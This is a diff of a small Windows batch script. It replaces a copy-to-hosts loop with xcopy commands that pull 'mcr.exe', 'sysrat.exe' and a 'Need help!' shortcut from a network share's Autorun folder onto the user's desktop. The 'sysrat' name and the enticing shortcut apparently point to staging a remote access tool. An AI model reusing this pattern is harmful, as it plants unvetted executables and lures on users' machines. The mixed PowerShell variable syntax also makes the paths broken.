@@ -1,5 +1,11 @@
-@echo on
-set file=zzz.txt
-set folder=fff
-set listfile=host.txt
-for /F %%i in (%listfile%) do xcopy %file% %%i\%folder%\ /Y
+echo OFF
+xcopy "\\eru.vsu.by\share_public\Autorun\mcr.exe" "C:\Users\$env:UserName\Desktop\" /f /i /y /s
+
+
+xcopy "\\eru.vsu.by\share_public\Autorun\sysrat.exe" "C:\Users\$env:UserName\Desktop\" /f /i /y /s
+
+xcopy "\\eru.vsu.by\share_public\Autorun\Нужна помощь!.lnk" "C:\Users\$env:UserName\Desktop\" /f /i /y /s
+
+
+
+
